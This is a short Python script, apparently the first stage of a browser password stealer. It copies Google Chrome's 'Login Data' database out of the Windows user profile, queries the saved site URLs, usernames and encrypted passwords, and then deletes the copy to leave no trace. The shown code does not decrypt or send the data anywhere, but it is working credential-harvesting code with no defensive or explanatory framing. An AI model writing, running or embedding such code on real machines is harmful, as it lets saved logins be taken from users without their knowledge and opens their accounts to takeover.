import shutil, sqlite3, os

db_name = "Loginvault.db"

chrome_path_login_db = os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
shutil.copy2(chrome_path_login_db, db_name)

conn = sqlite3.connect(db_name)
cursor = conn.cursor()

cursor.execute("SELECT action_url, username_value, password_value FROM logins")

login_data = []

for login in cursor.fetchall():
    login_data.append({
        "url": login[0],
        "username": login[1],
        "ciphertext": login[2]
    })

conn.close()
os.remove(db_name)